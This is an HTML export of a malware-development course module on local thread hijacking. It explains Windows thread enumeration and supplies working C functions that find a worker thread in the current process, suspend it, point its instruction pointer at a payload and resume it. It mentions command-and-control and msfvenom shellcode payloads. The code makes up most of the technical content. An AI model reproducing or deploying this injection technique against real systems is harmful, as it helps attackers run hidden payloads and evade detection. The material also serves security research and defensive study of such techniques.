<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>37. Thread Hijacking - Local Thread Enumeration</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="0e5417dc-3f84-4a68-aa31-9deb6a376ce9" class="page sans"><header><h1 class="page-title"><a href="https://maldevacademy.com/modules/37"><strong>37. Thread Hijacking - Local Thread Enumeration</strong></a></h1></header><div class="page-body"><h2 id="f78cca38-e902-400b-b04f-ee6c94c4c49e" class=""><strong>Thread Hijacking - Local Thread Enumeration</strong></h2><h3 id="25a176d4-c20c-457b-a388-e88cdac2ebd1" class=""><strong>Introduction</strong></h3><p id="33272e1c-2c93-4fa7-8298-b066acfa5838" class="">So far, when local thread hijacking was performed, the target thread was created using <code>CreateThread</code> and its context was modified. This module will demonstrate an alternative method where the system&#x27;s running threads are enumerated using <code>CreateToolhelp32Snapshot</code> and then hijacked.</p><h3 id="f753d136-8545-4b9a-8e1f-0e35b8079118" class=""><strong>Thread Enumeration</strong></h3><p id="9546c4a6-f5ba-4dfd-8e3d-ddafbe566383" class="">Recall the use of <code>CreateToolhelp32Snapshot</code> from previous modules, where the WinAPI was used to retrieve a snapshot of the system&#x27;s processes. In this module, the same WinAPI is being used but with a different value being used for the <a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot#parameters">dwFlags Parameter</a>. To enumerate the running threads on the system, the <code>TH32CS_SNAPTHREAD</code> flag must be specified. Using this flag, <code>CreateToolhelp32Snapshot</code> returns a <a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-threadentry32">THREADENTRY32</a> structure that&#x27;s shown below.</p><pre id="73cd1375-214c-49b6-83fa-21994908a4e9" class="code code-wrap"><code>typedef struct tagTHREADENTRY32 {
  DWORD dwSize;                       // sizeof(THREADENTRY32)
  DWORD cntUsage;
  DWORD th32ThreadID;                 // Thread ID
  DWORD th32OwnerProcessID;           // The PID of the process that created the thread.
  LONG  tpBasePri;
  LONG  tpDeltaPri;
  DWORD dwFlags;
} THREADENTRY32;
</code></pre><p id="c6de184b-22db-4563-936a-5168971b9f3c" class="">Each running thread has its own <code>THREADENTRY32</code> structure in the captured snapshot.</p><h3 id="c2da1531-7f5b-4ae7-93fb-eed19a48fed5" class=""><strong>Identifying The Thread&#x27;s Owner</strong></h3><p id="b9cd9088-85ad-4265-945e-4aee7e7335f6" class="">According to Microsoft&#x27;s documentation:</p><p id="46f740e2-27cc-4c11-a4a1-4832e6c60c74" class=""><em>To identify the threads that belong to a specific process, compare its process identifier to the </em><code><em>th32OwnerProcessID</em></code><em> member of the </em><code><em>THREADENTRY32</em></code><em> structure when enumerating the threads.</em></p><p id="de143793-2e89-417d-9ff6-ee8a6c44e0b6" class="">In other words, to determine the process to which the thread belongs, compare the target PID to <code>THREADENTRY32.th32OwnerProcessID</code>, which is the PID of the process that created the thread. If the PIDs match, then the thread presently being enumerated belongs to the target process.</p><h3 id="b454a395-6b38-4e58-8764-7dde3c17b34c" class=""><strong>Required WinAPIs</strong></h3><p id="618afd28-2c78-4c09-85ed-aa6482cf746b" class="">The following WinAPIs will be used to perform thread enumeration.</p><ul id="520a80e8-e36f-4298-978a-278c94f174ff" class="bulleted-list"><li style="list-style-type:disc"><a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot">CreateToolhelp32Snapshot</a> - Used with the <code>TH32CS_SNAPTHREAD</code> flag to receive a snapshot of all the threads running on the system.</li></ul><ul id="c42d8b91-6b40-4d4c-835e-82e8f572f551" class="bulleted-list"><li style="list-style-type:disc"><a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-thread32first">Thread32First</a> - Used to get the information about the first thread captured in the snapshot.</li></ul><ul id="3bbfdc6a-8a5d-445e-961b-f45df583f2cd" class="bulleted-list"><li style="list-style-type:disc"><a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-thread32next">Thread32Next</a>, Used to get the information about the next thread in the captured snapshot.</li></ul><ul id="2f7186dc-71a5-4b74-85f6-eca1dfc730bf" class="bulleted-list"><li style="list-style-type:disc"><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthread">OpenThread</a> - Used to open a handle to the target thread using its thread ID.</li></ul><ul id="2c39c7ca-79b3-46b2-9d67-487c7dcdd17e" class="bulleted-list"><li style="list-style-type:disc"><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocessid">GetCurrentProcessId</a> - Used to retrieve the local process&#x27;s PID. Since the local process is the target process, its PID is required to determine whether the threads belong to this process.</li></ul><h3 id="bf92187e-bac3-4ecb-b669-686143e43bb4" class=""><strong>Worker Threads</strong></h3><p id="bfc861f4-e9b1-47fc-9e26-3f0951f7a5a4" class="">Before diving into the thread enumeration code, it&#x27;s important to understand the concept of <em>worker threads</em>. Although <code>CreateThread</code> is not used in the code, the Windows operating system will create worker threads in the process. These worker threads are valid targets for thread hijacking. An example of these worker threads can be seen below.</p><figure id="9bafc40e-5c5b-4883-8f38-6329ab08a38d" class="image"><a href="37%20Thread%20Hijacking%20-%20Local%20Thread%20Enumeration%200e5417dc3f844a68aa319deb6a376ce9/tenum-0209185998-74b97dca-e541-401d-b700-b45852e7564a.png"><img style="width:1007px" src="37%20Thread%20Hijacking%20-%20Local%20Thread%20Enumeration%200e5417dc3f844a68aa319deb6a376ce9/tenum-0209185998-74b97dca-e541-401d-b700-b45852e7564a.png"/></a></figure><p id="dd898475-5b0c-4d0d-857f-0f75d98bd5eb" class="">The threads that are shown in the image above, such as <code>ntdll.dll!EtwNotificationRegister+0x2d0</code>, are created by the operating system to run the <code>EtwNotificationRegister</code> function, which is related to the <em>ETW - Event Tracing for Windows</em>. ETW will be explained in future modules but for now, it is sufficient to understand that this function is used to notify the operating system when a certain event occurs in the process.</p><h3 id="45fb81f8-09b3-43c4-bb05-6e6a49562829" class=""><strong>Thread Enumeration Function</strong></h3><p id="3e8b432c-4f2e-4a60-9b60-16d8da0e33d7" class=""><code>GetLocalThreadHandle</code> utilizes the previously mentioned steps to perform thread enumeration. It takes 3 arguments:</p><ul id="131be063-9e95-4e97-aace-bb25efc0f711" class="bulleted-list"><li style="list-style-type:disc"><code>dwMainThreadId</code> - The thread ID of the main thread of the local process. This is required to avoid targeting the local process&#x27;s main thread.</li></ul><ul id="3a25a96b-896d-4dba-b36c-033ba23b4d43" class="bulleted-list"><li style="list-style-type:disc"><code>dwThreadId</code> - A pointer to a DWORD that receives a hijackable thread&#x27;s ID.</li></ul><ul id="67d0dab8-dfab-4546-aeda-834fe3f1d907" class="bulleted-list"><li style="list-style-type:disc"><code>hThread</code> - A pointer to a HANDLE that receives a handle to the hijackable thread.</li></ul><pre id="f21d9f1f-a59f-4a9f-b49f-e0e1d85e6ddd" class="code code-wrap"><code>BOOL GetLocalThreadHandle(IN DWORD dwMainThreadId, OUT DWORD* dwThreadId, OUT HANDLE* hThread) {

	// Getting the local process ID
	DWORD           dwProcessId  = GetCurrentProcessId();
	HANDLE          hSnapShot    = NULL;
	THREADENTRY32   Thr          = {
		.dwSize = sizeof(THREADENTRY32)
	};

	// Takes a snapshot of the currently running processes&#x27;s threads
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf(&quot;\n\t[!] CreateToolhelp32Snapshot Failed With Error : %d \n&quot;, GetLastError());
		goto _EndOfFunction;
	}

	// Retrieves information about the first thread encountered in the snapshot.
	if (!Thread32First(hSnapShot, &amp;Thr)) {
		printf(&quot;\n\t[!] Thread32First Failed With Error : %d \n&quot;, GetLastError());
		goto _EndOfFunction;
	}

	do {
		// If the thread&#x27;s PID is equal to the PID of the target process then
		// this thread is running under the target process
		// The &#x27;Thr.th32ThreadID != dwMainThreadId&#x27; is to avoid targeting the main thread of our local process
		if (Thr.th32OwnerProcessID == dwProcessId &amp;&amp; Thr.th32ThreadID != dwMainThreadId) {

			// Opening a handle to the thread
			*dwThreadId  = Thr.th32ThreadID;
			*hThread     = OpenThread(THREAD_ALL_ACCESS, FALSE, Thr.th32ThreadID);

			if (*hThread == NULL)
				printf(&quot;\n\t[!] OpenThread Failed With Error : %d \n&quot;, GetLastError());

			break;
		}

	// While there are threads remaining in the snapshot
	} while (Thread32Next(hSnapShot, &amp;Thr));


_EndOfFunction:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	if (*dwThreadId == NULL || *hThread == NULL)
		return FALSE;
	return TRUE;
}

</code></pre><h3 id="471d0345-d0a0-4361-bdf9-1da95cfdcd6f" class=""><strong>Local Thread Hijacking Function</strong></h3><p id="de341483-d99b-4bc5-9b69-807dcc7a0354" class="">Once a valid handle to the target thread has been obtained, it can be passed to the <code>HijackThread</code> function. The <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread">SuspendThread</a> WinAPI will be used to suspend the thread and then <code>GetThreadContext</code> and <code>SetThreadContext</code> will be used to update the <code>RIP</code> register to point to the payload&#x27;s base address. Additionally, the payload must be written to the local process memory before hijacking the thread.</p><pre id="ec71914a-05fd-4aa3-90fa-205b1f840b41" class="code code-wrap"><code>
BOOL HijackThread(HANDLE hThread, PVOID pAddress) {

	CONTEXT	ThreadCtx = {
		.ContextFlags = CONTEXT_ALL
	};

	SuspendThread(hThread);

	if (!GetThreadContext(hThread, &amp;ThreadCtx)) {
		printf(&quot;\t[!] GetThreadContext Failed With Error : %d \n&quot;, GetLastError());
		return FALSE;
	}

	ThreadCtx.Rip = pAddress;

	if (!SetThreadContext(hThread, &amp;ThreadCtx)) {
		printf(&quot;\t[!] SetThreadContext Failed With Error : %d \n&quot;, GetLastError());
		return FALSE;
	}

	printf(&quot;\t[#] Press &lt;Enter&gt; To Run ... &quot;);
	getchar();

	ResumeThread(hThread);

	WaitForSingleObject(hThread, INFINITE);

	return TRUE;
}
</code></pre><h3 id="a7ebedb7-248f-4f93-b3f3-5cfd8729765c" class=""><strong>Demo</strong></h3><p id="def40c33-e09f-4f77-9e83-f79138c66f4a" class="">Note that the payload execution may take some time as the hijacked thread is not the main thread and does not run continuously.</p><figure id="f6de5f33-ce3f-424e-a4a3-7ef50655a20c" class="image"><a href="37%20Thread%20Hijacking%20-%20Local%20Thread%20Enumeration%200e5417dc3f844a68aa319deb6a376ce9/tenum-109188468-94e7741b-8953-4079-8a7c-8ab3cc449779.png"><img style="width:1473px" src="37%20Thread%20Hijacking%20-%20Local%20Thread%20Enumeration%200e5417dc3f844a68aa319deb6a376ce9/tenum-109188468-94e7741b-8953-4079-8a7c-8ab3cc449779.png"/></a></figure><p id="2e115768-51cd-4a00-a9cf-46dfc307fb7c" class="">Additionally, depending on the payload, the local process may crash after execution. For example, if the payload is for a command and control server, the process will continue running, however, if Msfvenom&#x27;s calc shellcode was used, the process will crash because Msfvenom&#x27;s calc shellcode terminates the calling thread.</p><figure id="81d3346b-a930-4156-a503-a1cd7a94f257" class="image"><a href="37%20Thread%20Hijacking%20-%20Local%20Thread%20Enumeration%200e5417dc3f844a68aa319deb6a376ce9/tenum-209188936-9a4de3fe-fd13-4a25-b343-153a59ea894b.png"><img style="width:1278px" src="37%20Thread%20Hijacking%20-%20Local%20Thread%20Enumeration%200e5417dc3f844a68aa319deb6a376ce9/tenum-209188936-9a4de3fe-fd13-4a25-b343-153a59ea894b.png"/></a></figure><p id="248c49af-d7a7-418a-a58b-24b0d3e90cd6" class="">
</p></div></article></body></html>